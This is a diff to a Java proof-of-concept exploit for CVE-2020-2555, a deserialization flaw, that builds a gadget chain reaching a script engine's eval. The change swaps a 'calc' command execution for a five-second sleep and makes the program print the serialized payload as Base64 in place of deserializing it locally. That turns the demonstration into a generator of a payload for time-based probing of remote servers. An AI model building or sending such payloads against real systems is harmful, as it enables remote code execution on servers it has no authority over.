@@ -11,6 +11,7 @@ import com.tangosol.util.filter.LimitFilter;
 import javax.management.BadAttributeValueExpException;
 import javax.script.ScriptEngineManager;
 import java.lang.reflect.Field;
+import java.util.Base64;
 
 public class TestScriptEngineWithCVE_2020_2555 {
     public static void main(String args[]) throws Exception {
@@ -32,7 +33,7 @@ public class TestScriptEngineWithCVE_2020_2555 {
 
         ReflectionExtractor extractor4 = new ReflectionExtractor(
                 "eval",
-                new Object[]{"java.lang.Runtime.getRuntime().exec('calc');"}
+                new Object[]{"java.lang.Runtime.getRuntime().sleep(5000);"}
         );
 
         ReflectionExtractor[] extractors = {
@@ -62,8 +63,9 @@ public class TestScriptEngineWithCVE_2020_2555 {
 
         //序列化
         byte[] bytes = Util.serialize(badAttributeValueExpException);
-
+        String encodedString = Base64.getEncoder().encodeToString(bytes);
+        System.out.println(encodedString);
         //反序列化
-        Util.deserialize(bytes);
+//        Util.deserialize(bytes);
     }
 }
